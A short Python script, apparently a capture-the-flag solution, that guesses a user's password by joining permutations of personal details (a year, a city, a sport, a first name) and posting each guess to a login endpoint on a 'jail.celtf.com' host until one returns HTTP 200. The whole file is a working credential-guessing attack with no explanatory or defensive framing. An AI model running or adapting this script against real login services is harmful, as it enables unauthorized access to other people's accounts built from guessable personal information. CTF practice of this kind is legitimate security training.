import itertools
import requests


url = 'http://target2.jail.celtf.com/api/user/_authorize'

word_list = ['1980', '05', '03', 'Tokyo', 'Soccer', 'Barcelona', 'tokyo', 'soccer', 'barcelona', 'John', 'john']

for comb_elements in itertools.combinations(sorted(word_list), 3):
    for mutated_elements in itertools.permutations(sorted(comb_elements)):
        password = "".join(mutated_elements)
        print('request send: password: ' + password)
        res = requests.post(url, auth=('john@example.com', password))
        print('response: ', res)
        if res.status_code == 200:
            print('user_id: john@example.com, password: ' + password)
            exit()
print('not found from word_list')
